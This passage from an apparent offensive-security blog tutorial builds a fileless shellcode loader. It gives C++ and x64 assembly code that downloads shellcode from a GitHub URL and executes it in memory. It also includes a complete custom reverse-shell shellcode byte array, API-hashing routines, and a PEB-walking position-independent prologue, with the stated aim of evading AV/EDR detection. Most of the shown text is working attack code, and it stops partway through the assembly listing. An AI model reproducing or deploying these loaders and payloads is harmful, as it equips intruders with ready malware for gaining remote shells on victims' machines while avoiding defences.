---
title:  Using Direct Syscalls with an In-Memory PIC Shellcode Loader
header:
  teaser: "/assets/images/pic_syscall.png"
categories:
  - Fileless Techniques
tags:
  - obfuscation
  - shellcode loader
  - '2025'
  - PIC shellcode
  - g3tsyst3m
  - Stager
  - In-Memory
  - PE Loader
  - Direct Syscalls
  - Windows 11
---

Today's post began in an unusual manner lol.  I wanted to explore the basic concept of creating an in-memory shellcode loader using APIs from the Wininet.h library.  I then got sidetracked and became interested in doing this purely using x64 assembly, which in turn led me to want to make it PIC friendly 😸  Furthermore, I also wanted to include the use of syscalls to help reduce detection at the EDR layer. 😹  All of that to just load some reverse shell shellcode.  

To kick things off, I started with some basic c++ code that would download and execute code in-memory.  The APIs I went with were `InternetOpenA`, `InternetOpenUrlA`, and `InternetReadFile`.  It's not an uncommon approach to downloading and executing shellcode, and you don't have to resort to using `wininet` either.  There are other perfectly suitable libraries that can download and execute files.  However, I'm personally most familiar with wininet.h so I went with it 😸

So, let's start with the C++ code share we?  That will give you an idea how all this began

In-memory Shellcode loader using C++ 
-

Here's the basic template I started out with:

```cpp
#include <wininet.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "kernel32.lib")

int main() {
    const char* agent = "Mozilla/5.0";
    // this is a reverse tcp shell
    // reg.dyno contains a destination IP 127.0.0.1 and port 9001
    // I like using random file extension as it seems to produce a smaller footprint in regards to EDR shenanigans :D
    const char* url = "https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/reg.dyno";

    // ---- Open Internet session ----
    HINTERNET hInternet = InternetOpenA(agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpenA failed: " << GetLastError() << "\n";
        return 1;
    }

    // ---- Open URL ----
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        std::cerr << "InternetOpenUrlA failed: " << GetLastError() << "\n";
        InternetCloseHandle(hInternet);
        return 1;
    }

    // ---- Read shellcode into memory ----
    std::vector<char> shellcode;
    char chunk[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) && bytesRead > 0) {
        shellcode.insert(shellcode.end(), chunk, chunk + bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (shellcode.empty()) {
        std::cerr << "Failed to download shellcode.\n";
        return 1;
    }

    // ---- Allocate writeable memory ----
    void* mem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        std::cerr << "VirtualAlloc failed: " << GetLastError() << "\n";
        return 1;
    }

    // ---- Copy shellcode ----
    memcpy(mem, shellcode.data(), shellcode.size());

    // ---- Change memory protection to executable ----
    DWORD oldProtect;
    if (!VirtualProtect(mem, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "VirtualProtect failed: " << GetLastError() << "\n";
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    // ---- Run shellcode on a new thread ----
    HANDLE hThread = CreateThread(
        NULL,                           // default security
        0,                              // default stack size
        (LPTHREAD_START_ROUTINE)mem,    // shellcode
        NULL,                           // parameter
        0,                              // default creation flags
        NULL                            // thread id
    );

    if (!hThread) {
        std::cerr << "CreateThread failed: " << GetLastError() << "\n";
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for shellcode to finish (optional)
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // ---- Free memory ----
    VirtualFree(mem, 0, MEM_RELEASE);

    return 0;
}
```

Also here is the code I used to export my shellcode to a file to be loaded by our shellcode loader.  Yeah I know, the shellcode is impossibly large and should be much smaller.  😸  It's my own custom reverse shell shellcode, so no msfvenom was used.  I didn't put too much effort into reducing the amount of total bytes, I really just focused on shellcode that was reliable and undetected out of the gate.  I took the exported file, c:\\users\\robbi\\reg.dyno, and uploaded it to one of my github repos.  That is the file we download, which contains our shellcode, and gets executed in memory.

```cpp
#include <fstream>
#include <vector>
#include <cstdint>

int main() {
    // Replace ... with your full byte array
    std::vector<uint8_t> shellcode = {
0x48,0x83,0xec,0x28,0x48,0x83,0xe4,0xf0,0x48,0x31,0xc9,0x65,0x48,0x8b,0x41,0x60,0x48,0x8b,0x40,0x18,0x48,0x8b,0x70,0x10,0x48,0x8b,
0x36,0x48,0x8b,0x36,0x48,0x8b,0x5e,0x30,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,
0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x44,0x8b,0x52,0x14,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4c,0x89,0xd1,
0x48,0xb8,0x64,0x64,0x72,0x65,0x73,0x73,0x90,0x90,0x48,0xc1,0xe0,0x10,0x48,0xc1,0xe8,0x10,0x50,0x48,0xb8,0x47,0x65,0x74,0x50,0x72,
0x6f,0x63,0x41,0x50,0x48,0x89,0xe0,0x67,0xe3,0x20,0x31,0xdb,0x41,0x8b,0x1c,0x8b,0x4c,0x01,0xc3,0x48,0xff,0xc9,0x4c,0x8b,0x08,0x4c,
0x39,0x0b,0x75,0xe9,0x44,0x8b,0x48,0x08,0x44,0x39,0x4b,0x08,0x74,0x03,0x75,0xdd,0xcc,0x51,0x41,0x5f,0x49,0xff,0xc7,0x4d,0x31,0xdb,
0x44,0x8b,0x5a,0x1c,0x4d,0x01,0xc3,0x43,0x8b,0x04,0xbb,0x4c,0x01,0xc0,0x50,0x41,0x5f,0x4d,0x89,0xfc,0x4c,0x89,0xc7,0x4c,0x89,0xc1,
0xb8,0x61,0x72,0x79,0x41,0x50,0x48,0xb8,0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,
0xd7,0x48,0x83,0xc4,0x30,0x49,0x89,0xc7,0x4d,0x89,0xe1,0x48,0x89,0xf9,0xb8,0x65,0x73,0x73,0x90,0xc1,0xe0,0x08,0xc1,0xe8,0x08,0x50,
0x48,0xb8,0x45,0x78,0x69,0x74,0x50,0x72,0x6f,0x63,0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,0xd1,0x48,0x83,0xc4,0x30,0x48,
0x89,0xc3,0x4d,0x89,0xe1,0x48,0x89,0xf9,0x48,0xb8,0x6f,0x63,0x65,0x73,0x73,0x41,0x90,0x90,0x48,0xc1,0xe0,0x10,0x48,0xc1,0xe8,0x10,
0x50,0x48,0xb8,0x43,0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,0xd1,0x48,0x83,0xc4,0x30,
0x49,0x89,0xc5,0xb8,0x6c,0x6c,0x90,0x90,0xc1,0xe0,0x10,0xc1,0xe8,0x10,0x50,0x48,0xb8,0x77,0x73,0x32,0x5f,0x33,0x32,0x2e,0x64,0x50,
0x48,0x89,0xe1,0x48,0x83,0xec,0x30,0x41,0xff,0xd7,0x49,0x89,0xc6,0x4c,0x89,0xf1,0xb8,0x75,0x70,0x90,0x90,0xc1,0xe0,0x10,0xc1,0xe8,
0x10,0x50,0x48,0xb8,0x57,0x53,0x41,0x53,0x74,0x61,0x72,0x74,0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,0xd4,0x49,0x89,0xc7,
0x4c,0x89,0xf1,0xb8,0x74,0x41,0x90,0x90,0xc1,0xe0,0x10,0xc1,0xe8,0x10,0x50,0x48,0xb8,0x57,0x53,0x41,0x53,0x6f,0x63,0x6b,0x65,0x50,
0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,0xd4,0x48,0x89,0xc6,0x4c,0x89,0xf1,0xb8,0x63,0x74,0x90,0x90,0xc1,0xe0,0x10,0xc1,0xe8,
0x10,0x50,0x48,0xb8,0x57,0x53,0x41,0x43,0x6f,0x6e,0x6e,0x65,0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,0xd4,0x48,0x89,0xc7,
0x4d,0x89,0xee,0x48,0x31,0xc9,0x66,0xb9,0x98,0x01,0x48,0x29,0xcc,0x48,0x8d,0x14,0x24,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,0x28,0x41,
0xff,0xd7,0x48,0x83,0xc4,0x30,0x48,0x31,0xc9,0xb1,0x02,0x48,0x31,0xd2,0xb2,0x01,0x4d,0x31,0xc0,0x41,0xb0,0x06,0x4d,0x31,0xc9,0x4c,
0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,0x24,0x28,0xff,0xd6,0x49,0x89,0xc4,0x48,0x83,0xc4,0x30,0x49,0x89,0xc5,0x4c,0x89,0xe9,0x48,0x31,
0xc0,0x48,0xff,0xc0,0x48,0xff,0xc0,0x48,0x89,0x04,0x24,0x66,0xb8,0x23,0x29,0x66,0x89,0x44,0x24,0x02,0x48,0xc7,0xc0,0x80,0xff,0xff,
0xfe,0x48,0xf7,0xd0,0x48,0x89,0x44,0x24,0x04,0x48,0x8d,0x14,0x24,0x41,0xb0,0x16,0x4d,0x31,0xc9,0x41,0x51,0x41,0x51,0x41,0x51,0x48,
0x83,0xc4,0x08,0x48,0x83,0xec,0x60,0x48,0x83,0xec,0x60,0xff,0xd7,0x48,0x83,0xc4,0x30,0x48,0xb8,0x9c,0x92,0x9b,0xd1,0x9a,0x87,0x9a,
0xff,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x41,0x55,0x41,0x55,0x41,0x55,0x48,0x31,0xc0,0x50,0x50,0x66,0x50,0xb0,0x01,0xc1,0xe0,0x08,
0x66,0x50,0x48,0x31,0xc0,0x50,0x50,0x50,0x66,0x50,0x66,0x50,0x50,0x50,0x50,0xb0,0x68,0x50,0x48,0x89,0xe7,0x48,0x89,0xe0,0x66,0x2d,
0xff,0x04,0x66,0xff,0xc8,0x50,0x57,0x48,0x31,0xc0,0x50,0x50,0x50,0x48,0xff,0xc0,0x50,0x48,0x31,0xc0,0x50,0x50,0x50,0x50,0x49,0x89,
0xc0,0x49,0x89,0xc1,0x48,0x89,0xca,0x48,0x89,0xc1,0x41,0xff,0xd6,0x48,0x31,0xc9,0xff,0xd3
    };

    std::ofstream file("c:\\users\\robbi\\reg.dyno", std::ios::binary);
    if (!file) {
        return 1;
    }

    file.write(reinterpret_cast<const char*>(shellcode.data()), shellcode.size());
    file.close();
    return 0;
}
```

So there you have it.  The above code template is the start to this journey I'm going to take you on 😆  Ultimately, I want to load shellcode in memory with a custom shellcode loader.  However, with some added flair.  LOL.  If it were just the above code, this would be a very boring post and also somewhat lackluster in my opinion.  We're going to take things to the next level!  Here's what I've got for you:

- Convert this C++ in-memory shellcode loader to x64 assembly
- Convert the x64 assembly to PIC (position independent code) shellcode that can be loaded using any method we choose and is not dependant on any fixed memory addresses or static variables, etc
- To help us remain under the radar so to speak, we will also use syscalls to load and execute our PIC shellcode in memory.
- Lastly, we profit and get a reverse shell 😸

Also for the record, this is fairly over the top I realize 😆  If you're a fan of The Big Bang Theory, it's basically this clip in a nutshell.  We're doing something that doesn't require nearly this much work but I'm doing it "because we can" lol. Also this will help briefly go over PIC shellcode and Direct Syscall stuff which I love.  All in one blog post 😸  

<iframe width="1080" height="720" 
        src="https://www.youtube.com/embed/BVd-rYIqSy8"
        title="YouTube video player" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe>

Also, if you ever want to go deeper into any topic I write about, feel free to check out my membership offering.  I don't mind helping here and there with quick questions via discord, but I think I owe it to you and myself to spend the proper time it takes to teach you a given topic thoroughly.  That's why I toss that out there.  No pressure, but it's there should anyone ever need it.

Converting the C++ in-memory shellcode loader to x64 Assembly
-

We're going to start with our nasm x64 assembly code to represent the base skeleton for our in memory shellcode download and execute functionality.  The code below uses externs to give you a nice overview for how this will play out.  Once again, our aim here is to reproduce the previously captured C++ in memory shellcode loader with an x64 assembly version.  I'm not going to go over all the code in great detail as I have a lot of ground to cover in today's post.  But, I do plan to explain this and more in my upcoming Shellcode video series where I teach you how to write x64 Assembly / Shellcode step by step.  It will go way beyond even what I covered on my blog.  Stay Tuned! 

Okay here's the code for Phase 1 of our in-memory shellcode loader.  I'll add comments throughout:

```nasm
bits 64
extern GetLastError
extern InternetOpenA
extern memcpy
extern RtlMoveMemory
extern InternetOpenUrlA
extern InternetReadFile
extern InternetCloseHandle
extern CloseHandle
extern ExitProcess
extern VirtualAlloc
extern VirtualFree
extern VirtualProtect
extern CreateThread
extern WaitForSingleObject

;nasm -f win64 [downloader.asm]
;x86_64-w64-mingw32-gcc downloader.obj -o downloader.exe -lwininet -lkernel32

section .data
    agent db "Mozilla/5.0",0

    ; this linked file below contains our reverse shell shellcode, also PIC friendly
    ;***********************************************************************
    url   db "https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/reg.dyno",0

;These are uninitialized variables that will get populated later
;***************************************************************
section .bss
hInternet  resq 1
hUrl       resq 1
hThread    resq 1
mem_buffer resq 1
oldProtect resd 1
bytesRead  resd 1
totalBytes resd 1
chunk      resb 4096

section .text
global main
main:
    sub rsp, 0x28
    and rsp, 0xFFFFFFFFFFFFFFF0

    ; ---- InternetOpenA ----
    ; initiate a handle to begin preparing for our URL

    lea rcx, [rel agent]     ; lpszAgent
    mov edx, 1               ; INTERNET_OPEN_TYPE_DIRECT
    xor r8, r8               ; lpszProxy
    xor r9, r9               ; lpszProxyBypass
    mov qword [rsp+0x20], 0 ; dwFlags
    call InternetOpenA
    mov [rel hInternet], rax             ; hInternet

    ; ---- InternetOpenUrlA ----
    ; Opens a handle to our github URL

    mov rcx, [rel hInternet]           ; hInternet
    lea rdx, [rel url]                 ; lpszUrl
    xor r8d, r8d                       ; lpszHeaders
    xor r9d, r9d                       ; dwHeadersLength
    mov dword [rsp+0x20], 0x4000000    ; dwFlags
    mov qword [rsp+0x28],0             ; dwContext
    call InternetOpenUrlA
    mov [rel hUrl], rax                       ; hUrl

    ;******************************************************************************************************
    ; download the file in chunks.  the data remains resident in memory and never touches disk
    ; we loop until we download all the shellcode and then save the memory location for the downloaded data
    ;******************************************************************************************************
    read_loop:
    ; ---- InternetReadFile ----
    mov rcx, [rel hUrl]                   ; HINTERNET hUrl
    lea rdx, [rel chunk]                  ; LPVOID lpBuffer
    mov r8d, 4096                     ; DWORD dwNumberOfBytesToRead
    lea r9, [rel bytesRead]               ; LPDWORD lpdwNumberOfBytesRead
    xor rax, rax
    call InternetReadFile
    test eax, eax
    je read_done
    cmp dword [rel bytesRead], 0
    jbe read_done

    mov ecx, dword [rel bytesRead]        ; load the DWORD from [r9] into ECX (the total bytes for our shellcode!)
    mov [rel totalBytes], ecx             ; store that value into totalBytes

   jmp read_loop

    read_done:
    ; ---- Close handles ----
    mov rcx, [rel hUrl]
    call InternetCloseHandle
    mov rcx, [rel hInternet]
    call InternetCloseHandle

    ; ---- Allocate memory ----
    ; allocate memory for our shellcode and make the memory location read/write for now.  less of a footprint for EDR

    mov rcx, 0                    ; LPVOID lpAddress = NULL
    mov rdx, 0x5000               ; SIZE_T dwSize = 20 KB for shellcode
    mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x04                 ; PAGE_READWRITE temporarily
    call VirtualAlloc
    mov [rel mem_buffer], rax

    ; ---- Copy shellcode ----
    ; Normally use memcpy(mem_buffer, chunk, bytesRead) or multiple chunks
    ; Decided to use RtlMoveMemory instead :)
    
    mov rcx, [rel mem_buffer]          ; destination
    lea rdx, [rel chunk]               ; source
    mov r8d, [rel totalBytes]                      ; size
    call RtlMoveMemory

    ; ---- Set executable ----
    ; now that the shellcode data is now stored in the assigned memory address, let's make that memory address executable
    xor rdx, rdx
    mov rcx, [rel mem_buffer]
    mov edx, [rel totalBytes]
    mov r8d, 0x20                  ; PAGE_EXECUTE_READ
    lea r9, [rel oldProtect]
    call VirtualProtect

    ; ---- Create thread ----
    ; point a thread to the memory address of our shellcode and execute it!
    xor rcx, rcx                   ; LPSECURITY_ATTRIBUTES = NULL
    xor rdx, rdx                   ; dwStackSize = 0
    mov r8, [rel mem_buffer]           ; LPTHREAD_START_ROUTINE
    xor r9, r9                     ; lpParameter = NULL
    mov rax, 0
    call CreateThread
    mov [rel hThread], rax

    ; ---- Wait for shellcode ----
    mov rcx, [rel hThread]
    mov rdx, 0xFFFFFFFF            ; INFINITE
    call WaitForSingleObject
    mov rcx, [rel hThread]
    call CloseHandle

    ; ---- Free memory ----
    mov rcx, [rel mem_buffer]
    mov rdx, 0
    mov r8d, 0x8000                ; MEM_RELEASE
    call VirtualFree

    ; Exit
    xor ecx, ecx
    call ExitProcess
```

Go ahead and compile that and run it.  Be sure to turn off your AV/EDR for now to have a smooth learning experience.  This isn't exactly EDR bypass material just yet 😸

```bash
nasm -f win64 downloader.asm
x86_64-w64-mingw32-gcc downloader.obj -o downloader.exe -lwininet -lkernel32
```

You should be greeted with a nice reverse shell!

<img width="995" height="269" alt="image" src="https://github.com/user-attachments/assets/a5494ffd-d22c-4be8-88a4-a4f8b2f97706" />

Cool, so we know it works.  😸 Plus, using `externs` for our APIs simplifies the process for conceptualizing going from C++ code to x64 assembly.  However, we now need to step it up a notch and move toward our end goal of PIC friendly shellcode.  This will remove all reliance upon .bss uniitialized variables and the .data section for starters.  But first, we need to prepare for loading all those APIs we used in this Phase 1 template.  We'll do that next!

API Hashing in x64 Assembly
-

Okay, so we need to start working our way toward that PIC shellcode.  Once again, that is Position Independent Shellcode that can be executed without reliance on any hardcoded memory addresses or initialized/uninitialized variables.  

We're going to use a ROT5 (ROTATE LEFT 5) + XOR hashing technique.  In essence, we are performing a bitwise rotatation of each character in our API string left by 5, and then Xoring it.  This will produce a reliable and unique hash.
Here's what that hashing routine looks like:

```nasm
initiator:
    xor eax, eax
next_char:
    mov bl, [rsi]       ; load next char
    test bl, bl
    jz store_hash
    rol eax, 5          ; rotate hash left 5 bits
    xor eax, ebx        ; hash ^= char
    inc rsi
    jmp next_char
```

It's as simple as that.  The rest of the assembly code is really just listing the APIs we wish to use to generate our hashes and then pushing the hashed value to the stack.  Here's the full code!

```nasm
bits 64

section .data
api1 db "GetProcAddress",0
api2 db "InternetOpenA",0
api3 db "RtlMoveMemory",0
api4 db "InternetOpenUrlA",0
api5 db "InternetReadFile",0
api6 db "InternetCloseHandle",0
api7 db "CloseHandle",0
api8 db "ExitProcess",0
api9 db "VirtualAlloc",0
api10 db "VirtualFree",0
api11 db "VirtualProtect",0
api12 db "CreateThread",0
api13 db "WaitForSingleObject",0
api14 db "LoadLibraryA",0

section .bss
;api1_hash resd 1        ; reserve 4 bytes for the hash (DWORD)

section .text
global main
main:
    xor ecx, ecx            ; counter to know which API we're on
    ; Hash the string
    api_1:
    lea rsi, [rel api1] ; rsi = pointer to string
    jmp initiator
    api_2:
    lea rsi, [rel api2]
    jmp initiator
    api_3:
    lea rsi, [rel api3]
    jmp initiator
    api_4:
    lea rsi, [rel api4]
    jmp initiator
    api_5:
    lea rsi, [rel api5]
    jmp initiator
    api_6:
    lea rsi, [rel api6]
    jmp initiator
    api_7:
    lea rsi, [rel api7]
    jmp initiator
    api_8:
    lea rsi, [rel api8]
    jmp initiator
    api_9:
    lea rsi, [rel api9]
    jmp initiator
    api_10:
    lea rsi, [rel api10]
    jmp initiator
    api_11:
    lea rsi, [rel api11]
    jmp initiator
    api_12:
    lea rsi, [rel api12]
    jmp initiator
    api_13:
    lea rsi, [rel api13]
    jmp initiator
    api_14:
    lea rsi, [rel api14]
    jmp initiator

initiator:
    xor eax, eax
    
next_char:
    mov bl, [rsi]       ; load next char
    test bl, bl
    jz store_hash
    rol eax, 5          ; rotate hash left 5 bits
    xor eax, ebx        ; hash ^= char
    inc rsi
    jmp next_char

store_hash:
    ;mov [rel api1_hash], eax  ; store final hash in .bss
    push rax
    inc ecx
    cmp ecx, 1
    je api_2
    cmp ecx, 2
    je api_3
    cmp ecx, 3
    je api_4
    cmp ecx, 4
    je api_5
    cmp ecx, 5
    je api_6
    cmp ecx, 6
    je api_7
    cmp ecx, 7
    je api_8
    cmp ecx, 8
    je api_9
    cmp ecx, 9
    je api_10
    cmp ecx, 10
    je api_11
    cmp ecx, 11
    je api_12
    cmp ecx, 12
    je api_13
    cmp ecx, 13
    je api_14
    cmp ecx, 14
    je goodbye

    goodbye:
    int3
    int3
    int3
```

Here's what that looks like in action.  Be sure to pay attention to the bottom right hand corner of x64dbg to see the hashed APIs pushed to the stack!

<iframe width="1080" height="720" 
        src="https://www.youtube.com/embed/Dxu9h35hw58" 
        title="YouTube video player" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe>

So now we have our hashes ready to go!  They are as follows (not in the order I pushed them in x64dbg btw):

```nasm
api6 dd 0xA4A1011B  ;loadlibrarya
api1 dd 0x80778D35  ;waitforsingleobject
api9 dd 0xCEFC5AFD  ;createthread
api2 dd 0x4A155ACA  ;virtualprotect
api3 dd 0x85B79578  ;virtualfree
api4 dd 0xB68D8A33  ;virtualalloc
api8 dd 0xE3DB70A7  ;exitprocess
api10 dd 0xD7277164  ;closehandle
api5 dd 0xC7DEFE95  ;rtlmovememory
api7 dd 0xE536B693  ; getprocaddress
```

Ok so now it's time dive into the full, revised assembly code.  This time around, we will be producing the PIC formatted assembly code.  I'll try and provide comments throughout but I promise to go into even greater detail in my soon to be x64 Assembly/Shellcode video series.  It will be a purchaseable item in my ko-fi shop once it's ready.  Ok let's start laying this code out.  I'll be going over it in segments because there's a lot to cover.  I corrected an issue with the loop code in the earlier examples by the way, so the read file loop will look a bit different in the PIC code.  Just FYI. See my comments inline below:

```nasm
;nasm -fwin64 [x64findkernel32.asm]
;x86_64-w64-mingw32-gcc downloader.obj -o downloader.exe

BITS 64

SECTION .data
SECTION .bss

;**********************************************************************
; This first part is just the standard prologue that all shellcode uses
; to walk the PEB and locate our API function addresses in memory
;**********************************************************************

section .text
global main
main:
                         ; metasploit shellcode normally starts with the same hex values.  using nops to start will help ours stand out less :)
                         ; plus this will be custom made shellcode so that helps too :)
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi,[rax+0x10]       ;PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]      ;kernel32.dll base address
mov r8, rbx              ; mov kernel32.dll base addr into r8
;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA
mov r13, r11                  ; Save for later
mov rcx, r10                  ; Set loop counter

;**********************************************************************
; In short, this second part is where we start cycling through all the API functions
; Starting with Z and working our way to A
; While that's happening, we hash each API with our hashing routine we discussed earlier
; And compare the hashed value with our predetermined hash values and see if there's a match!
;**********************************************************************

kernel32findfunction:             ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
    jmp hashinitiator
FunctionNameNotFound:
jmp continuation
FunctionNameFound:                ; Get function address from AddressOfFunctions
   inc ecx                        ; increase counter by 1 to account for decrement in loop
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov r15d, [r11+rcx*4]          ; Get the function RVA.
   add r15, r8                    ; Found the API! w00t!
   push r15                       ; Push the API we found to the stack for retrieval later.  We do this for all of them
   mov r11, r13
   dec ecx
   jmp kernel32findfunction

   ;********************************************************
   ; This is our hashing routine where we check if our hash
   ; matches the hash of the current API function
   ;********************************************************

   hashinitiator:
       xor eax, eax
       mov rsi, rbx
       xor rbx, rbx
   next_char:
       mov bl, [rsi]       ; load next char
       test bl, bl
       jz check_hash
       rol eax, 5          ; rotate hash left 5 bits
       xor eax, ebx        ; hash ^= char
       inc rsi
       jmp next_char

   ;********************************************************
   ; This is where we check the hash generated and stored in the EAX register
   ; with all of our pretermined hash values
   ; if there's a match that's found, we jump to FunctionNameFound
   ; and save the hash by pushing it to the stack
   ;********************************************************

   check_hash:
   cmp eax, 0x80778D35                ; Compare all bytes of eax with our pretermined hash values
   je FunctionNameFound               ; If match, function found
   cmp eax, 0x4A155ACA                
   je FunctionNameFound               
   cmp eax, 0x85B79578
   je FunctionNameFound
   cmp eax, 0xB68D8A33
   je FunctionNameFound
   cmp eax, 0xC7DEFE95
   je FunctionNameFound
   cmp eax, 0xA4A1011B
   je FunctionNameFound
   cmp eax, 0xE536B693
   je FunctionNameFound
   cmp eax, 0xE3DB70A7
   je FunctionNameFound
   cmp eax, 0xCEFC5AFD
   je FunctionNameFound
   cmp eax, 0xD7277164
   je FunctionNameFound
   
   jmp kernel32findfunction
   
continuation:

   ;********************************************************
   ; CONGRATS!  you found all the hashes, let's continue
   ;******************************************************** 

```

Phew!  that's a lot to take in am I right?  Well there's a lot more to it so hang on tight.  It doesn't get much easier lol.  Then again, that's what I love about this stuff!  The challenge is intoxicating, at least for me, and I thrive on a good challenge 😸  Ok spoiler alert.  I'm not going to be able to go into incredible detail on every aspect of the remaining code, though I will share it.  I like to keep these blog posts digestable in an easy to read fashion.  Not too wordy/lengthy, and my aim it to teach you while retaining your attention 😄  I'll show you how the code works up to this point, and briefly explain the rest.  Then we need to move on to the syscalls!

<iframe width="1080" height="720" 
        src="https://www.youtube.com/embed/VDKQnw4YLn8" 
        title="YouTube video player" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe>

As you can see, we managed to generate the API function names we were looking for using our hashes!

Next up, we basically locate the functions we need and call them

> **Let's locate GetProcAddress and Wininet**

```nasm

;****************************************************
; basically, all we need to do is locate our value's place on the stack
; for instance, LoadLibraryA is 80 bytes from where our stack pointer is 
; so we add rsp + 80 and we store that value in rax
; then call it!  
; rinse and repeat.  That's really all there is to it
; I used x64dbg to determine where they were on the stack by trial and error
;****************************************************

;locate wininet.dll
    mov rax, 0x9074656E696E6977     ; Add "wininet" string to RAX.
    shl rax, 0x8
    shr rax, 0x8
    push rax                        ; Push RAX to stack
    mov rcx, rsp                    ; Move a pointer to User32.dll into RCX.
    sub rsp, 0x28                   ; stack alignment
    mov rax, [rsp + 10*8]
    call rax                        ; Call LoadLibraryA("wininet.dll")
    add rsp, 0x30                   ; stack alignment
    mov rdi, rax                    ; holds wininet.dll address

; Prepare arguments for GetProcAddress to locate InternetOpenA
    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    mov rax, 0x909090416E65704F         ; Load "OpenA" into RAX
    shl rax, 0x18                    ; 0000000041786F00
    shr rax, 0x18                    ; 000000000041786F
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetOpenA" (second argument)
    sub rsp, 0x30
    mov rax, [rsp + 11*8]
    mov rsi, rax                   ; save GetProcAddress for later
    call rax                       ; Call GetProcAddress
    add rsp, 0x30
    mov r15, rax                    ; store InternetOpenA    

;****************************************************************
; store the wininet address and internetopenA in rdi and r15 registers, respectively
;rdi = wininet.dll
;r15 = InternetOpenA
;****************************************************************
```

The remainder of the code I'm just going to paste here and let you walk through it as your homework assignment 😸 It's a lot to explain and I'd prefer to stick with my video series to cover the remainder of code versus typing out the explanation for each aspect of the remaining code.  I do still offer up some light comments throughout:

```nasm
 ;Prepare arguments for GetProcAddress to locate InternetOpenUrlA
    xor rax, rax
    push rax
    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    mov rax, 0x416C72556E65704F         ; Load "OpenUrlA" into RAX
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetOpenUrlA" (second argument)
    sub rsp, 0x38
    call rsi              ; Call GetProcAddress
    add rsp, 0x30
    mov r14, rax                    ; store InternetOpenUrlA    

; Prepare arguments for GetProcAddress to locate InternetReadFile
